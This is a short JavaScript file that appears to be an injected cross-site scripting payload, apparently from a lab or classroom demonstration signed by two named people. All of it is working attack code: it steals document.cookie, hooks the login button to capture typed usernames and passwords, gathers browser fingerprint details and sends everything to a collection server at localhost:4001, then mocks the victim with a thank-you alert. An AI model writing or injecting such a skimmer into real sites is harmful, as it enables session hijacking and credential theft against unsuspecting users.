alert("Hello from Kevin and Johannes, click the person-icon in the top right and try to login");

var hostname = "http://localhost:4001/message"

//get the cookies
var xhr = new XMLHttpRequest();
var cookie = document.cookie;
xhr.open('GET', hostname+"?data=cookie:"+cookie , true);
xhr.send();

function sendInfo(elem) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', hostname + "?data=" + elem);
    xhr.send();
}

var input = document.getElementsByClassName("user-input");
var pass = document.getElementsByClassName("password-input");
var loginbtn = document.getElementsByClassName("login-bn")[0].addEventListener("click", function(){
    sendInfo(
        "login:" + input[0].value + "\n" + 
        "pass:" + pass[0].value
    );
    alert("thank you for your information ;)")
});

sendInfo("vendor: " + navigator.vendor);
sendInfo("agent: " + navigator.userAgent);
sendInfo("appversion: " + navigator.appVersion);
sendInfo("platform: " + navigator.platform);